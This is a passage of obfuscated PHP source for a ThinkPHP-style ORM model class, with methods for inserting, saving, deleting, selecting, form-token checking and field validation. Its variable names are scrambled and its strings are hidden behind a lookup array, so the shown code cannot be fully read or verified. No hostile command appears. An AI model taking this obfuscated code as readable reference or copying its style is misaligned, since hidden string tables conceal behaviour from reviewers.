$this->fields); } } public function switchModel($¯¹ÒîÎ´, $®µşµşº = array()) { $Ä¡…áÏ =& $_SERVER[ˆ¡¹µ‹Â]; $óƒ—Œ°· = ucwords(strtolower($¯¹ÒîÎ´)) . $Ä¡…áÏ[330]; if (!class_exists($óƒ—Œ°·)) { think_exception($óƒ—Œ°· . think_lang($Ä¡…áÏ[331])); } $this->_extModel = new $óƒ—Œ°·($this->name); if (!empty($®µşµşº)) { foreach ($®µşµşº as $‚íÌ†ú—) { $this->_extModel->setProperty($‚íÌ†ú—, $this->{$‚íÌ†ú—}); } } return $this->_extModel; } public function __set($ïÁğ‹öû, $¹öíëíÀ) { $this->data[$ïÁğ‹öû] = $¹öíëíÀ; } public function __get($ç™ñÜÄá) { return isset($this->data[$ç™ñÜÄá]) ? $this->data[$ç™ñÜÄá] : null; } public function __isset($Š•ÙÕÚ) { return isset($this->data[$Š•ÙÕÚ]); } public function __unset($šäßš¦è) { unset($this->data[$šäßš¦è]); } public function __call($Æğ©ş§ˆ, $”’ë»ˆ) { $ö„ù¥°ï =& $_SERVER[ˆ¡¹µ‹Â]; if (in_array(strtolower($Æğ©ş§ˆ), $this->methods, !0)) { $this->options[strtolower($Æğ©ş§ˆ)] = $”’ë»ˆ[0]; return $this; } elseif (in_array(strtolower($Æğ©ş§ˆ), array($ö„ù¥°ï[332], $ö„ù¥°ï[333], $ö„ù¥°ï[334], $ö„ù¥°ï[335], $ö„ù¥°ï[336]), !0)) { $Õ†Í›‡ü = isset($”’ë»ˆ[0]) ? $”’ë»ˆ[0] : $ö„ù¥°ï[220]; $Õ†Í›‡ü = $this->db->parseKey($Õ†Í›‡ü); return $this->getField(strtoupper($Æğ©ş§ˆ) . $ö„ù¥°ï[337] . $Õ†Í›‡ü . $ö„ù¥°ï[338] . $Æğ©ş§ˆ, $ö„ù¥°ï[332]); } elseif (strtolower(substr($Æğ©ş§ˆ, 0, 5)) == $ö„ù¥°ï[339]) { $Õ†Í›‡ü = think_parse_name(substr($Æğ©ş§ˆ, 5)); $–‹˜×€ü[$Õ†Í›‡ü] = $”’ë»ˆ[0]; return $this->where($–‹˜×€ü)->find(); } elseif (strtolower(substr($Æğ©ş§ˆ, 0, 10)) == $ö„ù¥°ï[340]) { $‡œœĞùƒ = think_parse_name(substr($Æğ©ş§ˆ, 10)); $–‹˜×€ü[$‡œœĞùƒ] = $”’ë»ˆ[0]; return $this->where($–‹˜×€ü)->getField($”’ë»ˆ[1]); } elseif (isset($this->_scope[$Æğ©ş§ˆ])) { return $this->scope($Æğ©ş§ˆ, $”’ë»ˆ[0]); } elseif (method_exists($this, $Æğ©ş§ˆ)) { array_unshift($”’ë»ˆ, $Æğ©ş§ˆ); return call_user_func_array(array($this, $ö„ù¥°ï[341]), $”’ë»ˆ); } else { return call_user_func_array(array(parent, $Æğ©ş§ˆ), $”’ë»ˆ); } } protected function call() { $ÆáÅ“‘ =& $_SERVER[ˆ¡¹µ‹Â]; $şà²òüÆ = func_get_args(); $­îÏä = array_shift($şà²òüÆ); $ñâê‡ß× = $­îÏä; if (is_array($­îÏä)) { $ñâê‡ß× = $­îÏä[1]; $­îÏä = $­îÏä[0]; } $ÈßÁ¼» = count($şà²òüÆ) - 1; if (isset($şà²òüÆ[$ÈßÁ¼»]) && $şà²òüÆ[$ÈßÁ¼»] === $­îÏä) { think_exception(__CLASS__ . $ÆáÅ“‘[4] . $­îÏä . think_lang($ÆáÅ“‘[342])); return; } $şà²òüÆ[] = $­îÏä; if (method_exists($this, $ÆáÅ“‘[343])) { $²óÂãƒŞ = call_user_func_array(array($this, $ÆáÅ“‘[344]), array($ñâê‡ß×, $şà²òüÆ)); if (!is_null($²óÂãƒŞ) && $²óÂãƒŞ !== !1) { return $²óÂãƒŞ; } } $—ïİóóú = call_user_func_array(array($this, $­îÏä), $şà²òüÆ); if (method_exists($this, $ÆáÅ“‘[345])) { $²óÂãƒŞ = call_user_func_array(array($this, $ÆáÅ“‘[346]), array($ñâê‡ß×, $şà²òüÆ, $—ïİóóú)); if ($²óÂãƒŞ) { return $²óÂãƒŞ; } } return $—ïİóóú; } protected function _initialize() { } protected function _facade($ÀÀÎş¼) { $Ûã¦ÃŒ =& $_SERVER[ˆ¡¹µ‹Â]; if (!empty($this->fields)) { foreach ($ÀÀÎş¼ as $£Ôº³×É => $É’¯ŞÙ) { if (is_array($this->fields) && !in_array($£Ôº³×É, $this->fields, !0)) { unset($ÀÀÎş¼[$£Ôº³×É]); } elseif (is_scalar($É’¯ŞÙ)) { $this->_parseType($ÀÀÎş¼, $£Ôº³×É); } } } if (!empty($this->options[$Ûã¦ÃŒ[347]])) { $ÀÀÎş¼ = array_map($this->options[$Ûã¦ÃŒ[347]], $ÀÀÎş¼); unset($this->options[$Ûã¦ÃŒ[347]]); } $this->_beforeWrite($ÀÀÎş¼); return $ÀÀÎş¼; } protected function _beforeWrite(&$­•½Ö™) { } public function add($¼¬°šù“ = '', $¥ĞìûÃÈ = array(), $ºëˆü¯• = false) { if (empty($¼¬°šù“)) { if (!empty($this->data)) { $¼¬°šù“ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ˆ¡¹µ‹Â][348]); return !1; } } $¥ĞìûÃÈ = $this->_parseOptions($¥ĞìûÃÈ); $¼¬°šù“ = $this->_facade($¼¬°šù“); if (!1 === $this->_beforeInsert($¼¬°šù“, $¥ĞìûÃÈ)) { return !1; } $›å¹Áà¢ = $this->db->insert($¼¬°šù“, $¥ĞìûÃÈ, $ºëˆü¯•); if (!1 !== $›å¹Áà¢) { $´ìÂêÈ = $this->getLastInsID(); if ($´ìÂêÈ) { $¼¬°šù“[$this->getPk()] = $´ìÂêÈ; $this->_after_insert($¼¬°šù“, $¥ĞìûÃÈ); return $´ìÂêÈ; } $this->_after_insert($¼¬°šù“, $¥ĞìûÃÈ); } return $›å¹Áà¢; } protected function _beforeInsert(&$ıÛºÓûû, $ÂÁ´ÈÂĞ) { } protected function _after_insert($ˆÎô¬«ª, $¤¸º¦½) { } public function addAll($¾é†»¼‡, $ì‹Ûˆ‚— = array(), $ğĞü•ç¶ = false) { $°ÚíÌšİ =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($¾é†»¼‡)) { $this->error = think_lang($°ÚíÌšİ[348]); return !1; } $ì‹Ûˆ‚— = $this->_parseOptions($ì‹Ûˆ‚—); foreach ($¾é†»¼‡ as $äµæ¿Ó° => $ËÒ¨Á²¹) { $¾é†»¼‡[$äµæ¿Ó°] = $this->_facade($ËÒ¨Á²¹); } if (method_exists($this->db, $°ÚíÌšİ[349])) { $½ù´Ü¼ = $this->db->insertAll($¾é†»¼‡, $ì‹Ûˆ‚—, $ğĞü•ç¶); } else { $this->startTrans(); foreach ($¾é†»¼‡ as $äµæ¿Ó° => $ËÒ¨Á²¹) { $½ù´Ü¼ = $this->db->insert($ËÒ¨Á²¹, $ì‹Ûˆ‚—, $ğĞü•ç¶); } $this->commit(); } if (!1 !== $½ù´Ü¼) { $ŠÅìİİå = $this->getLastInsID(); if ($ŠÅìİİå) { return $ŠÅìİİå; } } return $½ù´Ü¼; } public function selectAdd($Õ¿Ûí¹â = '', $†½¬õ×© = '', $¬şçé‰  = array()) { $Á˜•´Ğæ =& $_SERVER[ˆ¡¹µ‹Â]; $¬şçé‰  = $this->_parseOptions($¬şçé‰ ); if (!1 === ($Ê™ëÍßÅ = $this->db->selectInsert($Õ¿Ûí¹â ? $Õ¿Ûí¹â : $¬şçé‰ [$Á˜•´Ğæ[350]], $†½¬õ×© ? $†½¬õ×© : $this->getTableName(), $¬şçé‰ ))) { $this->error = think_lang($Á˜•´Ğæ[351]); return !1; } else { return $Ê™ëÍßÅ; } } public function save($Œº¬×íë = '', $‹¥åÁ‘ˆ = array()) { $†Éè‘£¾ =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($Œº¬×íë)) { if (!empty($this->data)) { $Œº¬×íë = $this->data; $this->data = array(); } else { $this->error = think_lang($†Éè‘£¾[348]); return !1; } } $Œº¬×íë = $this->_facade($Œº¬×íë); $‹¥åÁ‘ˆ = $this->_parseOptions($‹¥åÁ‘ˆ); $ÙÏºÅüÉ = $this->getPk(); if (!isset($‹¥åÁ‘ˆ[$†Éè‘£¾[352]])) { if (isset($Œº¬×íë[$ÙÏºÅüÉ])) { $ëª‘‡Ñ¤[$ÙÏºÅüÉ] = $Œº¬×íë[$ÙÏºÅüÉ]; $‹¥åÁ‘ˆ[$†Éè‘£¾[352]] = $ëª‘‡Ñ¤; unset($Œº¬×íë[$ÙÏºÅüÉ]); } else { $this->error = think_lang($†Éè‘£¾[351]); return !1; } } if (is_array($‹¥åÁ‘ˆ[$†Éè‘£¾[352]]) && isset($‹¥åÁ‘ˆ[$†Éè‘£¾[352]][$ÙÏºÅüÉ])) { $ØšÂ¸Ï× = $‹¥åÁ‘ˆ[$†Éè‘£¾[352]][$ÙÏºÅüÉ]; } if (!1 === $this->_beforeUpdate($Œº¬×íë, $‹¥åÁ‘ˆ)) { return !1; } $û×½¹Ñã = $this->db->update($Œº¬×íë, $‹¥åÁ‘ˆ); if (!1 !== $û×½¹Ñã) { if (isset($ØšÂ¸Ï×)) { $Œº¬×íë[$ÙÏºÅüÉ] = $ØšÂ¸Ï×; } $this->_afterUpdate($Œº¬×íë, $‹¥åÁ‘ˆ); } return $û×½¹Ñã; } protected function _beforeUpdate(&$ÇÉñì´€, $‰äŒÖ) { } protected function _afterUpdate($¯Ú³ŠÅ, $§…Öñ•³) { } public function delete($üÇâŠÌì = array()) { $×ïÁõâÈ =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($üÇâŠÌì) && empty($this->options[$×ïÁõâÈ[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $“¸¦óÁª = $this->getPk(); if (is_numeric($üÇâŠÌì) || is_string($üÇâŠÌì)) { if (strpos($üÇâŠÌì, $×ïÁõâÈ[50])) { $¶‰£ĞèÁ[$“¸¦óÁª] = array($×ïÁõâÈ[353], $üÇâŠÌì); } else { $¶‰£ĞèÁ[$“¸¦óÁª] = $üÇâŠÌì; } $this->options[$×ïÁõâÈ[352]] = $¶‰£ĞèÁ; } $üÇâŠÌì = $this->_parseOptions(); if (is_array($üÇâŠÌì[$×ïÁõâÈ[352]]) && isset($üÇâŠÌì[$×ïÁõâÈ[352]][$“¸¦óÁª])) { $œŒØ†ƒ‚ = $üÇâŠÌì[$×ïÁõâÈ[352]][$“¸¦óÁª]; } $Ú¹£•ò£ = $this->db->delete($üÇâŠÌì); if (!1 !== $Ú¹£•ò£) { $ ´ù™° = array(); if (isset($œŒØ†ƒ‚)) { $ ´ù™°[$“¸¦óÁª] = $œŒØ†ƒ‚; } $this->_after_delete($ ´ù™°, $üÇâŠÌì); } return $Ú¹£•ò£; } protected function _after_delete($Ú½«ù¿î, $Îƒœ—¦) { } public function select($©ú¨á»Î = array()) { $Ö®ğ¢¤Ç =& $_SERVER[ˆ¡¹µ‹Â]; if (is_string($©ú¨á»Î) || is_numeric($©ú¨á»Î)) { $ÎÈåÁ¸° = $this->getPk(); if (strpos($©ú¨á»Î, $Ö®ğ¢¤Ç[50])) { $¹…¥æä¥[$ÎÈåÁ¸°] = array($Ö®ğ¢¤Ç[353], $©ú¨á»Î); } else { $¹…¥æä¥[$ÎÈåÁ¸°] = $©ú¨á»Î; } $this->options[$Ö®ğ¢¤Ç[352]] = $¹…¥æä¥; } elseif (!1 === $©ú¨á»Î) { $©ú¨á»Î = $this->_parseOptions(); return $Ö®ğ¢¤Ç[354] . $this->db->buildSelectSql($©ú¨á»Î) . $Ö®ğ¢¤Ç[355]; } $©ú¨á»Î = $this->_parseOptions(); $Š†èœ«¹ = $this->db->select($©ú¨á»Î); if (!1 === $Š†èœ«¹) { return !1; } if (empty($Š†èœ«¹)) { return null; } $this->_afterSelect($Š†èœ«¹, $©ú¨á»Î); return $Š†èœ«¹; } protected function _afterSelect(&$šîïñµ”, $å«ÔÏŸ) { } public function buildSql($‘‡Š¼ûÎ = array()) { $Øš•¼û‚ =& $_SERVER[ˆ¡¹µ‹Â]; $‘‡Š¼ûÎ = $this->_parseOptions($‘‡Š¼ûÎ); return $Øš•¼û‚[354] . $this->db->buildSelectSql($‘‡Š¼ûÎ) . $Øš•¼û‚[355]; } public function optionsValue($ËãÊÔ¥ = null) { if (is_null($ËãÊÔ¥)) { return $this->options; } elseif (is_array($ËãÊÔ¥)) { $this->options = array_merge($this->options, $ËãÊÔ¥); } } protected function _parseOptions($³¥‡¥€ª = array()) { $­ÇÔ°ÙÉ =& $_SERVER[ˆ¡¹µ‹Â]; if (is_array($³¥‡¥€ª)) { $³¥‡¥€ª = array_merge($this->options, $³¥‡¥€ª); } $this->options = array(); if (!isset($³¥‡¥€ª[$­ÇÔ°ÙÉ[356]])) { $³¥‡¥€ª[$­ÇÔ°ÙÉ[356]] = $this->getTableName(); $´Ô¬«Òˆ = $this->fields; } else { $´Ô¬«Òˆ = $this->getDbFields(); } if (!empty($³¥‡¥€ª[$­ÇÔ°ÙÉ[357]])) { $³¥‡¥€ª[$­ÇÔ°ÙÉ[356]] .= $­ÇÔ°ÙÉ[53] . $³¥‡¥€ª[$­ÇÔ°ÙÉ[357]]; } $³¥‡¥€ª[$­ÇÔ°ÙÉ[358]] = $this->name; if (isset($³¥‡¥€ª[$­ÇÔ°ÙÉ[352]]) && is_array($³¥‡¥€ª[$­ÇÔ°ÙÉ[352]]) && !empty($´Ô¬«Òˆ) && !isset($³¥‡¥€ª[$­ÇÔ°ÙÉ[359]]) && !isset($³¥‡¥€ª[$­ÇÔ°ÙÉ[356]])) { foreach ($³¥‡¥€ª[$­ÇÔ°ÙÉ[352]] as $©ã½²û => $ˆÕŸä´ñ) { $©ã½²û = trim($©ã½²û); if (in_array($©ã½²û, $´Ô¬«Òˆ, !0)) { if (is_scalar($ˆÕŸä´ñ)) { $this->_parseType($³¥‡¥€ª[$­ÇÔ°ÙÉ[352]], $©ã½²û); } } elseif (!is_numeric($©ã½²û) && $­ÇÔ°ÙÉ[11] != substr($©ã½²û, 0, 1) && !1 === strpos($©ã½²û, $­ÇÔ°ÙÉ[10]) && !1 === strpos($©ã½²û, $­ÇÔ°ÙÉ[337]) && !1 === strpos($©ã½²û, $­ÇÔ°ÙÉ[214]) && !1 === strpos($©ã½²û, $­ÇÔ°ÙÉ[360])) { unset($³¥‡¥€ª[$­ÇÔ°ÙÉ[352]][$©ã½²û]); } } } $this->_options_filter($³¥‡¥€ª); return $³¥‡¥€ª; } protected function _options_filter(&$óÚç‘¥) { } protected function _parseType(&$¤¦Ù˜²ğ, $ö°–‘•·) { $”óÖ¿– =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($this->options[$”óÖ¿–[361]][$”óÖ¿–[4] . $ö°–‘•·])) { $¤î”‹¨ç = strtolower($this->fields[$”óÖ¿–[329]][$ö°–‘•·]); if (!1 !== strpos($¤î”‹¨ç, $”óÖ¿–[362])) { } elseif (!1 === strpos($¤î”‹¨ç, $”óÖ¿–[363]) && !1 !== strpos($¤î”‹¨ç, $”óÖ¿–[364])) { $¤¦Ù˜²ğ[$ö°–‘•·] = intval($¤¦Ù˜²ğ[$ö°–‘•·]); } elseif (!1 !== strpos($¤î”‹¨ç, $”óÖ¿–[365]) || !1 !== strpos($¤î”‹¨ç, $”óÖ¿–[366])) { $¤¦Ù˜²ğ[$ö°–‘•·] = floatval($¤¦Ù˜²ğ[$ö°–‘•·]); } elseif (!1 !== strpos($¤î”‹¨ç, $”óÖ¿–[367])) { $¤¦Ù˜²ğ[$ö°–‘•·] = (bool) $¤¦Ù˜²ğ[$ö°–‘•·]; } } } public function find($º™Ú¥áÛ = array()) { $°±ÜÃÔ =& $_SERVER[ˆ¡¹µ‹Â]; if (is_numeric($º™Ú¥áÛ) || is_string($º™Ú¥áÛ)) { $œüİ‡Ê[$this->getPk()] = intval($º™Ú¥áÛ); $this->options[$°±ÜÃÔ[352]] = $œüİ‡Ê; } $this->options[$°±ÜÃÔ[368]] = 1; $º™Ú¥áÛ = $this->_parseOptions(); $ï˜Á™éË = $this->db->select($º™Ú¥áÛ); if (!1 === $ï˜Á™éË) { return !1; } if (empty($ï˜Á™éË)) { return null; } $this->data = $ï˜Á™éË[0]; $this->_afterFind($this->data, $º™Ú¥áÛ); if (!empty($this->options[$°±ÜÃÔ[369]])) { return $this->returnResult($this->data, $this->options[$°±ÜÃÔ[369]]); } return $this->data; } protected function _afterFind(&$’ŞëÎã£, $õıÉàöÚ) { } protected function returnResult($›ÌÎ±”, $±æ§¨¸Ø = '') { $‡İæÆ‘„ =& $_SERVER[ˆ¡¹µ‹Â]; if ($±æ§¨¸Ø) { if (is_callable($±æ§¨¸Ø)) { return call_user_func($±æ§¨¸Ø, $›ÌÎ±”); } switch (strtolower($±æ§¨¸Ø)) { case $‡İæÆ‘„[370]: return json_encode($›ÌÎ±”); case $‡İæÆ‘„[371]: return xml_encode($›ÌÎ±”); } } return $›ÌÎ±”; } public function parseFieldsMap($âˆ˜£îª, $¤ğ»‹Ôš = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÀüÙ–Ú => $ÇÓ¾¦–¼) { if ($¤ğ»‹Ôš == 1) { if (isset($âˆ˜£îª[$ÇÓ¾¦–¼])) { $âˆ˜£îª[$ÀüÙ–Ú] = $âˆ˜£îª[$ÇÓ¾¦–¼]; unset($âˆ˜£îª[$ÇÓ¾¦–¼]); } } else { if (isset($âˆ˜£îª[$ÀüÙ–Ú])) { $âˆ˜£îª[$ÇÓ¾¦–¼] = $âˆ˜£îª[$ÀüÙ–Ú]; unset($âˆ˜£îª[$ÀüÙ–Ú]); } } } } return $âˆ˜£îª; } public function setField($‘á‰’, $ÍÏŠá¸ï = '') { if (is_array($‘á‰’)) { $Éİ…ç±É = $‘á‰’; } else { $Éİ…ç±É[$‘á‰’] = $ÍÏŠá¸ï; } return $this->save($Éİ…ç±É); } public function setAdd($ª±ô€íº, $ßõšñÏ½ = 1) { $Ç¯æ«ˆÙ =& $_SERVER[ˆ¡¹µ‹Â]; $ı¼—º¶© = $ª±ô€íº . $Ç¯æ«ˆÙ[372] . $ßõšñÏ½; if ($ßõšñÏ½ < 0) { $ı¼—º¶© = $ª±ô€íº . $ßõšñÏ½; } return $this->setField($ª±ô€íº, array($Ç¯æ«ˆÙ[373], $ı¼—º¶©)); } public function getField($¤ÍŒÖÍ, $ÔÍìåİŒ = null) { $×ğ¨Š›ê =& $_SERVER[ˆ¡¹µ‹Â]; $²Ú¼êò[$×ğ¨Š›ê[350]] = $¤ÍŒÖÍ; $²Ú¼êò = $this->_parseOptions($²Ú¼êò); $¤ÍŒÖÍ = trim($¤ÍŒÖÍ); if (strpos($¤ÍŒÖÍ, $×ğ¨Š›ê[50])) { if (!isset($²Ú¼êò[$×ğ¨Š›ê[368]])) { $²Ú¼êò[$×ğ¨Š›ê[368]] = is_numeric($ÔÍìåİŒ) ? $ÔÍìåİŒ : $×ğ¨Š›ê[12]; } $‚‹Ä¡°– = $this->db->select($²Ú¼êò); if (!empty($‚‹Ä¡°–)) { $ÑÆÏş¸ = explode($×ğ¨Š›ê[50], $¤ÍŒÖÍ); $¤ÍŒÖÍ = array_keys($‚‹Ä¡°–[0]); $•ô—Ş’ğ = array_shift($¤ÍŒÖÍ); $ô¨÷Û¸‹ = array_shift($¤ÍŒÖÍ); $×Åáİ†¯ = array(); $²®ßˆ›Ş = count($ÑÆÏş¸); foreach ($‚‹Ä¡°– as $–ïß…È) { $¶¤¤—şƒ = $–ïß…È[$•ô—Ş’ğ]; if (2 == $²®ßˆ›Ş) { $×Åáİ†¯[$¶¤¤—şƒ] = $–ïß…È[$ô¨÷Û¸‹]; } else { $×Åáİ†¯[$¶¤¤—şƒ] = is_string($ÔÍìåİŒ) ? implode($ÔÍìåİŒ, $–ïß…È) : $–ïß…È; } } return $×Åáİ†¯; } } else { if (!0 !== $ÔÍìåİŒ) { $²Ú¼êò[$×ğ¨Š›ê[368]] = is_numeric($ÔÍìåİŒ) ? $ÔÍìåİŒ : 1; } if ($ÔÍìåİŒ === $×ğ¨Š›ê[332]) { unset($²Ú¼êò[$×ğ¨Š›ê[368]]); } $–ïß…È = $this->db->select($²Ú¼êò); if (!empty($–ïß…È)) { if ($ÔÍìåİŒ === $×ğ¨Š›ê[332]) { return reset($–ïß…È[0]); } if (!0 !== $ÔÍìåİŒ && 1 == $²Ú¼êò[$×ğ¨Š›ê[368]]) { return reset($–ïß…È[0]); } foreach ($–ïß…È as $üÎ¢éİ) { $Îğ›Û­[] = $üÎ¢éİ[$¤ÍŒÖÍ]; } return $Îğ›Û­; } } return null; } public function create($²«­»¤” = '', $º÷­Ã™ = '') { $¬èÂ»Ûü =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($²«­»¤”)) { $²«­»¤” = $_POST; } elseif (is_object($²«­»¤”)) { $²«­»¤” = get_object_vars($²«­»¤”); } if (empty($²«­»¤”) || !is_array($²«­»¤”)) { $this->error = think_lang($¬èÂ»Ûü[348]); return !1; } $²«­»¤” = $this->parseFieldsMap($²«­»¤”, 0); $º÷­Ã™ = $º÷­Ã™ ? $º÷­Ã™ : (!empty($²«­»¤”[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¬èÂ»Ûü[350]])) { $ïˆ£¯ïÖ = $this->options[$¬èÂ»Ûü[350]]; unset($this->options[$¬èÂ»Ûü[350]]); } elseif ($º÷­Ã™ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ïˆ£¯ïÖ = $this->insertFields; } elseif ($º÷­Ã™ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ïˆ£¯ïÖ = $this->updateFields; } if (isset($ïˆ£¯ïÖ)) { if (is_string($ïˆ£¯ïÖ)) { $ïˆ£¯ïÖ = explode($¬èÂ»Ûü[50], $ïˆ£¯ïÖ); } if (think_config($¬èÂ»Ûü[374])) { $ïˆ£¯ïÖ[] = think_config($¬èÂ»Ûü[375]); } foreach ($²«­»¤” as $ïÚ›ìûê => $œ•¸®œ) { if (!in_array($ïÚ›ìûê, $ïˆ£¯ïÖ)) { unset($²«­»¤”[$ïÚ›ìûê]); } } } if (!$this->autoValidation($²«­»¤”, $º÷­Ã™)) { return !1; } if (!$this->autoCheckToken($²«­»¤”)) { $this->error = think_lang($¬èÂ»Ûü[376]); return !1; } if ($this->autoCheckFields) { $ïˆ£¯ïÖ = $this->getDbFields(); foreach ($²«­»¤” as $ïÚ›ìûê => $œ•¸®œ) { if (!in_array($ïÚ›ìûê, $ïˆ£¯ïÖ)) { unset($²«­»¤”[$ïÚ›ìûê]); } elseif (MAGIC_QUOTES_GPC && is_string($œ•¸®œ)) { $²«­»¤”[$ïÚ›ìûê] = stripslashes($œ•¸®œ); } } } $this->autoOperation($²«­»¤”, $º÷­Ã™); $this->data = $²«­»¤”; return $²«­»¤”; } public function autoCheckToken($ÒÈ§‘§¸) { $Æè«¹‰³ =& $_SERVER[ˆ¡¹µ‹Â]; if (isset($this->options[$Æè«¹‰³[377]]) && !$this->options[$Æè«¹‰³[377]]) { return !0; } if (think_config($Æè«¹‰³[374])) { $ù—òÕ‹¿ = think_config($Æè«¹‰³[375]); if (!isset($ÒÈ§‘§¸[$ù—òÕ‹¿]) || Session::get($ù—òÕ‹¿)) { return !1; } list($®œÓ„º, $½ŠšÆ·­) = explode($Æè«¹‰³[11], $ÒÈ§‘§¸[$ù—òÕ‹¿]); if ($½ŠšÆ·­ && Session::get($ù—òÕ‹¿ . $Æè«¹‰³[10] . $®œÓ„º) === $½ŠšÆ·­) { Session::remove($ù—òÕ‹¿ . $Æè«¹‰³[10] . $®œÓ„º); return !0; } if (think_config($Æè«¹‰³[378])) { Session::remove($ù—òÕ‹¿ . $Æè«¹‰³[10] . $®œÓ„º); } return !1; } return !0; } public function regex($‡úı×, $‘áñÌ») { $İ—É±ÕÍ =& $_SERVER[ˆ¡¹µ‹Â]; $ÃŸ¡şòº = array($İ—É±ÕÍ[379] => $İ—É±ÕÍ[380], $İ—É±ÕÍ[381] => $İ—É±ÕÍ[382], $İ—É±ÕÍ[383] => $İ—É±ÕÍ[384], $İ—É±ÕÍ[385] => $İ—É±ÕÍ[386], $İ—É±ÕÍ[387] => $İ—É±ÕÍ[388], $İ—É±ÕÍ[389] => $İ—É±ÕÍ[390], $İ—É±ÕÍ[391] => $İ—É±ÕÍ[392], $İ—É±ÕÍ[366] => $İ—É±ÕÍ[393], $İ—É±ÕÍ[394] => $İ—É±ÕÍ[395]); if (isset($ÃŸ¡şòº[strtolower($‘áñÌ»)])) { $‘áñÌ» = $ÃŸ¡şòº[strtolower($‘áñÌ»)]; } return preg_match($‘áñÌ», $‡úı×) === 1; } private function autoOperation(&$“Êñœü‡, $À„‚æ¿) { $‡Òé©ğ =& $_SERVER[ˆ¡¹µ‹Â]; if (!empty($this->options[$‡Òé©ğ[396]])) { $ß™Ğ¦° = $this->options[$‡Òé©ğ[396]]; unset($this->options[$‡Òé©ğ[396]]); } elseif (!empty($this->_auto)) { $ß™Ğ¦° = $this->_auto; } if (isset($ß™Ğ¦°)) { foreach ($ß™Ğ¦° as $àû¶ß¢) { if (empty($àû¶ß¢[2])) { $àû¶ß¢[2] = THINK_MODEL_INSERT; } if ($À„‚æ¿ == $àû¶ß¢[2] || $àû¶ß¢[2] == THINK_MODEL_BOTH) { switch (trim($àû¶ß¢[3])) { case $‡Òé©ğ[397]: case $‡Òé©ğ[398]: $ÑÁ¿¢Éç = isset($àû¶ß¢[4]) ? (array) $àû¶ß¢[4] : array(); if (isset($“Êñœü‡[$àû¶ß¢[0]])) { array_unshift($ÑÁ¿¢Éç, $“Êñœü‡[$àû¶ß¢[0]]); } if ($‡Òé©ğ[397] == $àû¶ß¢[3]) { $“Êñœü‡[$àû¶ß¢[0]] = call_user_func_array($àû¶ß¢[1], $ÑÁ¿¢Éç); } else { $“Êñœü‡[$àû¶ß¢[0]] = call_user_func_array(array(&$this, $àû¶ß¢[1]), $ÑÁ¿¢Éç); } break; case $‡Òé©ğ[350]: $“Êñœü‡[$àû¶ß¢[0]] = $“Êñœü‡[$àû¶ß¢[1]]; break; case $‡Òé©ğ[399]: if ($‡Òé©ğ[12] === $“Êñœü‡[$àû¶ß¢[0]]) { unset($“Êñœü‡[$àû¶ß¢[0]]); } break; case $‡Òé©ğ[400]: default: $“Êñœü‡[$àû¶ß¢[0]] = $àû¶ß¢[1]; } if (!1 === $“Êñœü‡[$àû¶ß¢[0]]) { unset($“Êñœü‡[$àû¶ß¢[0]]); } } } } return $“Êñœü‡; } protected function autoValidation($—ÜŸåêê, $‰¡É·ÒÜ) { $±­¡Âƒ  =& $_SERVER[ˆ¡¹µ‹Â]; if (!empty($this->options[$±­¡Âƒ [401]])) { $‘ä¨‡Ìß = $this->options[$±­¡Âƒ [401]]; unset($this->options[$±­¡Âƒ [401]]); } elseif (!empty($this->_validate)) { $‘ä¨‡Ìß = $this->_validate; } if (isset($‘ä¨‡Ìß)) { if ($this->patchValidate) { $this->error = array(); } foreach ($‘ä¨‡Ìß as $ÛÜ‚íì… => $æÉÖ¬ÖÆ) { if (empty($æÉÖ¬ÖÆ[5]) || $æÉÖ¬ÖÆ[5] == THINK_MODEL_BOTH || $æÉÖ¬ÖÆ[5] == $‰¡É·ÒÜ) { if (0 == strpos($æÉÖ¬ÖÆ[2], $±­¡Âƒ [402]) && strpos($æÉÖ¬ÖÆ[2], $±­¡Âƒ [403])) { $æÉÖ¬ÖÆ[2] = think_lang(substr($æÉÖ¬ÖÆ[2], 2, -1)); } $æÉÖ¬ÖÆ[3] = isset($æÉÖ¬ÖÆ[3]) ? $æÉÖ¬ÖÆ[3] : THINK_EXISTS_VALIDATE; $æÉÖ¬ÖÆ[4] = isset($æÉÖ¬ÖÆ[4]) ? $æÉÖ¬ÖÆ[4] : $±­¡Âƒ [404]; switch ($æÉÖ¬ÖÆ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($—ÜŸåêê, $æÉÖ¬ÖÆ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($±­¡Âƒ [12] != trim($—ÜŸåêê[$æÉÖ¬ÖÆ[0]])) { if (!1 === $this->_validationField($—ÜŸåêê, $æÉÖ¬ÖÆ)) { return !1; } } break; default: if (isset($—ÜŸåêê[$æÉÖ¬ÖÆ[0]])) { if (!1 === $this->_validationField($—ÜŸåêê, $æÉÖ¬ÖÆ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ö†õˆİå, $Şë›¾«„) { if (!1 === $this->_validationFieldItem($Ö†õˆİå, $Şë›¾«„)) { if ($this->patchValidate) { $this->error[$Şë›¾«„[0]] = $Şë›¾«„[2]; } else { $this->error = $Şë›¾«„[2]; return !1; } } return; } protected function _validationFieldItem($ÛæšÊ˜, $”¹ôµşÛ) { $Á²»˜Ö« =& $_SERVER[ˆ¡¹µ‹Â]; switch (strtolower(trim($”¹ôµşÛ[4]))) { case $Á²»˜Ö«[397]: case $Á²»˜Ö«[398]: $Æ Œ£Ôƒ = isset($”¹ôµşÛ[6]) ? (array) $”¹ôµşÛ[6] : array(); if (is_string($”¹ôµşÛ[0]) && strpos($”¹ôµşÛ[0], $Á²»˜Ö«[50])) { $”¹ôµşÛ[0] = explode($Á²»˜Ö«[50], $”¹ôµşÛ[0]); } if (is_array($”¹ôµşÛ[0])) { foreach ($”¹ôµşÛ[0] as $Âº¾ÃÁ) { $ì½Í¶æª[$Âº¾ÃÁ] = $ÛæšÊ˜[$Âº¾ÃÁ]; } array_unshift($Æ Œ£Ôƒ, $ì½Í¶æª); } else { 